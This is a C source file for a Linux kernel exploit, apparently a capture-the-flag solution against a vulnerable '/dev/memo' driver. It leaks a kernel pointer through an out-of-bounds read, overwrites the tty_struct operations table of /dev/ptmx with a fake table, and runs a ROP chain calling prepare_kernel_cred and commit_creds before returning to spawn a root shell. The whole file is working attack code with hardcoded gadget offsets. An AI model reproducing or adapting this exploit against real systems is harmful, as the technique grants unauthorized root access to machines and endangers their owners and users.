#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include "fileops.h"
#define log_info(...) { \
    printf("[*] "); \
    printf(__VA_ARGS__); \
    putchar(10); \
};
u_int64_t user_ip;
u_int64_t user_cs;
u_int64_t user_rflags;
u_int64_t user_sp;
u_int64_t user_ss;
void get_shell(){
    if(getuid()){
        puts("Cuts");
        exit(-1);
    }
    system("/bin/sh");
}
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    user_ip = get_shell;
    log_info("Saved user state");
}
int memo, ptmx;
u_int64_t memo_chunk;
u_int64_t ptm_unix98_ops_offset = 0xe65900;
u_int64_t ptm_unix98_ops;
u_int64_t kernel_base;
u_int64_t kernel_heap_base;
u_int64_t commit_creds;
u_int64_t prepare_kernel_cred;
u_int64_t process_cred_ptr;
void open_drive(){
    memo = open("/dev/memo",O_RDWR);
    ptmx = open("/dev/ptmx",O_RDWR | O_NOCTTY);
    log_info("Opened memo");
}
u_int64_t read_buffer[0x400/8];
void leak(){
    
    lseek(memo,0x300,SEEK_SET);
    read(memo,read_buffer,0x400);
    ptm_unix98_ops = read_buffer[0x23];
    kernel_base = ptm_unix98_ops - ptm_unix98_ops_offset;
    log_info("ptm_unix98_ops: %p",(void *)ptm_unix98_ops);
    log_info("Kernel base: %p",(void *)kernel_base);
    prepare_kernel_cred = kernel_base + 0x7bb50;
    commit_creds = kernel_base + 0x7b8b0;
    memo_chunk = read_buffer[0x27]-0x438;
    log_info("Memo chunk @ %p",(void *)memo_chunk);
}
void store_fake_ops(){
    u_int64_t buffer[0x90];
    struct tty_operations fakeops;
    memset(&fakeops,0,sizeof(fakeops));
    fakeops.ioctl  = kernel_base+0x94d4e3; //push r12 ; add dword ptr [rbp + 0x41], ebx ; pop rsp ; pop r13 ; ret
    lseek(memo,0,SEEK_SET);
    write(memo,&fakeops,sizeof(fakeops));
    log_info("Fake ops has been stored in memo chunk!");
}
u_int64_t write_buffer[0x400/8];
u_int64_t rop[0x120/8];
void overwrite(){
    memcpy(write_buffer,read_buffer,0x400);

    size_t off=0;
    write_buffer[0x23] = memo_chunk;
    log_info("...");
    getchar();
    lseek(memo,0x300,SEEK_SET);
    write(memo,write_buffer,0x400);
    log_info("Overwrited tty_struct.ops!");
    
    lseek(memo,0x80,SEEK_SET);
    rop[off++] = 0; //dummy r13
    rop[off++] = kernel_base + 0x988fef; //pop rdi;ret
    rop[off++] = 0;
    rop[off++] = prepare_kernel_cred;
    rop[off++] = kernel_base + 0x331532; //push rax ; pop rdx ; ret
    rop[off++] = kernel_base + 0x437991; // mov rdi, rdx ; sub rax, rsi ; mov qword ptr [rcx], rdi ; ret
    rop[off++] = commit_creds;
    rop[off++] = kernel_base + 0xa00a45;
    rop[off++] = 0; //dummy rax
    rop[off++] = 0; //dummy rdi
    rop[off++] = user_ip;
    rop[off++] = user_cs;
    rop[off++] = user_rflags;
    rop[off++] = user_sp;
    rop[off++] = user_ss;
    write(memo,rop,0x120);
    log_info("Stored rops in memo_chunk+0x100");
    getchar();
    //write(ptmx,(void *)(memo_chunk+0x100),sizeof(memo_chunk));
    //set_termios(ptmx,(void *)(memo_chunk+0x100));
    ioctl(ptmx,0,memo_chunk+0x80);
}
void main(){
    save_state();
    open_drive();
    leak();
    store_fake_ops();
    overwrite();
    getchar();
}

